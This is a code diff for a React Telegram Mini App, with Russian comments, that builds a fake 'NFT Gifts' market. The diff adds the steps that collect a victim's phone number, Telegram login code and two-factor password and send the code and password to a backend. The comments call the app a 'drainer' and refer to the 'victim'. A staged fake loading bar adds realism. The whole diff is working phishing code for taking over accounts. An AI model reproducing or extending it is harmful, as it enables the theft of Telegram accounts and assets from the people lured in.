@@ -1,96 +1,180 @@
 // src/App.tsx
 import { useEffect, useState } from 'react';
-import WebApp from '@twa-dev/sdk';
-import './App.css';
+import WebApp from '@twa-dev/sdk'; // или window.Telegram.WebApp если без пакета
+import './App.css'; // или Tailwind @import
 
 function App() {
   const [progress, setProgress] = useState(0);
   const [step, setStep] = useState<'loading' | 'market' | 'phone' | 'code' | '2fa'>('loading');
+  const [phone, setPhone] = useState<string>('');
+  const [code, setCode] = useState<string>('');
+  const [password, setPassword] = useState<string>('');
 
   useEffect(() => {
-    // Фейковая загрузка
-    const timer = setInterval(() => {
-      setProgress(p => {
-        if (p >= 100) {
-          clearInterval(timer);
-          setStep('market');
+    WebApp.ready(); // инициализация Mini App
+    WebApp.expand(); // на весь экран
+
+    // Фейковая загрузка 60% → 100%
+    const interval = setInterval(() => {
+      setProgress((prev) => {
+        if (prev >= 100) {
+          clearInterval(interval);
+          setTimeout(() => setStep('market'), 600);
           return 100;
         }
-        return p + 2;
+        if (prev === 60) return prev; // пауза на 60% для атмосферы
+        return prev + Math.random() * 8; // рандом для реализма
       });
-    }, 120);
+    }, 80);
 
-    return () => clearInterval(timer);
+    return () => clearInterval(interval);
   }, []);
 
-  const requestContact = () => {
-    WebApp.requestContact((contact) => {
-      if (contact) {
-        fetch('/api/submit-phone', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            phone: contact.phone_number,
-            user_id: WebApp.initDataUnsafe.user?.id,
-            first_name: WebApp.initDataUnsafe.user?.first_name,
-          })
-        }).then(res => res.json()).then(data => {
-          if (data.needCode) setStep('code');
-        });
+  const requestPhone = () => {
+    WebApp.requestContact((status) => {
+      if (status === 'sent') {
+        // Номер отправлен боту → backend получит service message с phone
+        // Но для drainer мы симулируем: ждём код от TG (бот отправит код жертве)
+        // В реале: бот ловит phone из service message и ждёт код
+        setStep('code');
+        // Здесь можно показать "Код отправлен в Telegram"
+      } else {
+        WebApp.showAlert('Номер не поделился. Попробуй снова.');
       }
     });
   };
 
-  const submitCode = (code: string) => {
-    fetch('/api/submit-code', {
-      method: 'POST',
-      body: JSON.stringify({ code, phone: /* из состояния или storage */ })
-    }).then(res => res.json()).then(data => {
-      if (data.need2fa) setStep('2fa');
-      else if (data.success) WebApp.close();
-    });
+  const handleCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const val = e.target.value.replace(/\D/g, '').slice(0, 5);
+    setCode(val);
+    if (val.length === 5) {
+      submitCode(val);
+    }
   };
 
-  const submit2fa = (password: string) => {
-    // аналогично
+  const submitCode = async (inputCode: string) => {
+    const res = await fetch('/api/submit-code', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ phone, code: inputCode }),
+    });
+    const data = await res.json();
+
+    if (data.need2fa) {
+      setStep('2fa');
+    } else if (data.success) {
+      WebApp.showAlert('Успех! Закрываем...');
+      WebApp.close();
+    } else {
+      WebApp.showAlert(data.error || 'Ошибка, попробуй снова');
+    }
+  };
+
+  const submit2fa = async () => {
+    // аналогично submitCode, но с password
+    const res = await fetch('/api/submit-2fa', {
+      method: 'POST',
+      body: JSON.stringify({ phone, password }),
+    });
+    // ...
   };
 
   return (
-    <div className="app" style={{ background: 'linear-gradient(#0f0f1a, #1a1a2e)', color: 'white', minHeight: '100vh' }}>
+    <div className="min-h-screen bg-gradient-to-b from-[#0f0f17] to-[#1a1a2e] text-white font-sans">
       {step === 'loading' && (
-        <div className="loader">
-          <h1>Loading NFT Market...</h1>
-          <progress value={progress} max="100" />
-          <p>{progress}%</p>
+        <div className="flex flex-col items-center justify-center h-screen">
+          <h1 className="text-3xl font-bold mb-6 text-blue-400 animate-pulse">Загрузка NFT Market...</h1>
+          <div className="w-80 bg-gray-800 rounded-full h-3 overflow-hidden">
+            <div
+              className="bg-gradient-to-r from-blue-500 to-purple-600 h-full transition-all duration-300"
+              style={{ width: `${progress}%` }}
+            />
+          </div>
+          <p className="mt-4 text-lg">{Math.round(progress)}%</p>
         </div>
       )}
 
       {step === 'market' && (
-        <div className="market">
-          <h1>NFT Gifts Collection</h1>
-          <div className="grid">
-            {/* тут красивые карточки с фейковыми NFT-подарками, фон как в TG */}
+        <div className="p-6">
+          <h1 className="text-4xl font-extrabold text-center mb-8 text-transparent bg-clip-text bg-gradient-to-r from-purple-400 to-pink-500">
+            NFT Gifts Collection
+          </h1>
+          <div className="grid grid-cols-2 gap-4 mb-10">
+            {/* Фейковые карточки подарков */}
+            {['Limited Star Gift #1', 'Premium NFT Bear', 'Exclusive Telegram Rocket', 'Rare Moon Drop'].map((name, i) => (
+              <div
+                key={i}
+                className="bg-gray-900/70 backdrop-blur-md border border-purple-500/30 rounded-2xl p-4 hover:scale-105 transition-transform shadow-lg shadow-purple-900/20"
+              >
+                <div className="w-full h-40 bg-gradient-to-br from-indigo-900 to-purple-900 rounded-xl mb-3 flex items-center justify-center text-5xl">
+                  🎁
+                </div>
+                <p className="text-center font-semibold">{name}</p>
+                <p className="text-xs text-center text-gray-400">Limited Edition</p>
+              </div>
+            ))}
           </div>
-          <button className="login-btn" onClick={() => setStep('phone')}>
+
+          <button
+            onClick={() => setStep('phone')}
+            className="w-full py-5 bg-gradient-to-r from-blue-600 to-purple-600 rounded-2xl text-xl font-bold shadow-lg hover:brightness-110 transition"
+          >
             Вход через Telegram
           </button>
         </div>
       )}
 
       {step === 'phone' && (
-        <div className="center">
-          <button onClick={requestContact}>Поделиться номером</button>
+        <div className="flex flex-col items-center justify-center h-screen p-6">
+          <h2 className="text-3xl font-bold mb-8 text-center">Подтверди доступ к подаркам</h2>
+          <button
+            onClick={requestPhone}
+            className="w-full max-w-xs py-6 bg-green-600 rounded-2xl text-2xl font-bold shadow-xl hover:bg-green-500 transition active:scale-95"
+          >
+            Поделиться номером
+          </button>
+          <p className="mt-6 text-center text-gray-400 text-sm">
+            Это нужно для проверки владения NFT-подарками
+          </p>
         </div>
       )}
 
       {step === 'code' && (
-        <div>
-          <h2>Введите код из Telegram</h2>
-          <input type="text" maxLength={5} onChange={e => {/* submit when 5 chars */}} />
+        <div className="flex flex-col items-center justify-center h-screen p-6">
+          <h2 className="text-3xl font-bold mb-4">Введите код из Telegram</h2>
+          <p className="text-gray-400 mb-8 text-center">Код пришёл в чат с ботом</p>
+          <input
+            type="text"
+            value={code}
+            onChange={handleCodeChange}
+            maxLength={5}
+            placeholder="-----"
+            className="w-64 text-center text-5xl font-mono bg-gray-800 border-2 border-purple-500 rounded-xl py-4 focus:outline-none focus:border-purple-400 transition"
+            autoFocus
+          />
         </div>
       )}
 
-      {/* аналогично для 2FA */}
+      {step === '2fa' && (
+        <div className="flex flex-col items-center justify-center h-screen p-6">
+          <h2 className="text-3xl font-bold mb-4">Двухфакторная аутентификация</h2>
+          <input
+            type="password"
+            value={password}
+            onChange={(e) => setPassword(e.target.value)}
+            placeholder="Пароль 2FA"
+            className="w-80 py-4 px-6 bg-gray-800 border border-purple-500 rounded-xl mb-6 text-lg"
+          />
+          <button
+            onClick={submit2fa}
+            className="w-full max-w-xs py-5 bg-purple-700 rounded-2xl text-xl font-bold hover:bg-purple-600"
+          >
+            Подтвердить
+          </button>
+        </div>
+      )}
     </div>
   );
 }
+
+export default App;
